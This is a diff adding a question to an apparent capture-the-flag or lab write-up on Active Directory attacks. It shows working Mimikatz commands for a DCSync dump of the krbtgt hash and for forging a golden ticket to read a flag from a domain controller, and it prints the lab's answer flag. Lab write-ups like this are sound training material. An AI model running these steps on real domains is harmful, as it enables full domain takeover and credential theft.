@@ -154,3 +154,30 @@ Afte restarting the computer, execute all the mimikatz commands again, and you w
 
 ## Q7. What attack can this user perform? 
 Answer is simple Dcsync.
+
+## Q8.  Take over the domain and submit the contents of the flag.txt file on the Administrator Desktop on DC01 
+We will spawn the shell as user Tpretty,
+
+Then will create the golden ticket and will use that in order to get the flag:
+```
+lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:INLANEFREIGHT\krbtgt
+```
+After this we will try to get the SID of the session, using the following command (make sure to import the PowerView):
+```
+Get-DomainSID
+```
+
+Use mimikatz to create hacker user account in current command prompt console session.
+```
+kerberos::golden /User:hacker /domain:INLANEFREIGHT.LOCAL /sid:S-1-5-21-2270287766-1317258649-2146029398 /krbtgt:6dbd63f4a0e7c8b221d61f265c4a08a7 /id:500 /ptt
+exit  
+```
+
+Then in the current session we can get the flag:
+```
+type \\dc01\c$\Users\Administrator\Desktop\flag.txt
+```
+
+<img width="1706" height="577" alt="image" src="https://github.com/user-attachments/assets/32ee4329-6d46-4d5f-88cf-68312b34f964" />
+
+**r3plicat1on_m@st3r!**
